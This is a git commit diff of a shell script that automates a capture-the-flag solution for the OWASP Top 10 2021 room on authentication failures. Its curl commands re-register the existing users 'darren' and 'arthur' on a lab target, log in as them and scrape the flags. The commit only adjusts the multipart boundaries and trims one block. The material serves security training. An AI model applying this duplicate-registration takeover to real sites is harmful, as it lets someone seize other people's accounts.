2438f7c4694907f25a680252ceab98e3c53c5751
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-12-01 10:40:08 -0500

    Testing script

--- rooms/owasptop102021/7-identification-and-authentication-failures.sh
+++ rooms/owasptop102021/7-identification-and-authentication-failures.sh
@@ -17,9 +17,9 @@ curl -s -X GET "http://$target_ip:8088" -c "/work/7-cookies.txt" -L > /dev/null
 PHPSESSID=$(grep PHPSESSID "/work/7-cookies.txt" | awk '{print $7}')
 echo "--> Session initiated : $PHPSESSID"
 
-# Registering darren a second time
+# Registering darren a second time --- CAUTION : The boundary in the file is the one Content-Type plus 2 entry -- !!!
 echo "2 - REGISTERING DARREN"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace-darren.log -H "Content-Type: multipart/form-data; boundary=-----------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/darren.txt
+curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/darren.txt
 
 # Logging as adrren
 echo "3 - ANALYZING DARREN"
@@ -28,18 +28,9 @@ echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-
 
 # Registering arthur a second time
 echo "4 - REGISTERING ARTHUR"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace-arthur.log -H "Content-Type: multipart/form-data; boundary=-----------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/arthur.txt
+curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/arthur.txt
 
 # Logging as arthur
 echo "5 - ANALYZING ARTHUR"
 curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+arthur" -d "pass=test" -o /work/7-arthur.html
 echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-arthur.html | sed ':a;N;$!ba;s/[\n\t ]//g')"
-
-# Registering nadege a second time
-echo "4 - REGISTERING ARTHUR"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L \
-     -H "Origin: http://$target_ip:8088" \
-     -H "Referer: http://$target_ip:8088/register.php" \
-     -H "Content-Type: multipart/form-data; boundary=--------------------------346104398912025331583998084524" \
-    --no-buffer \
-     --data-binary @${scriptpath}/7-data/nadege.txt
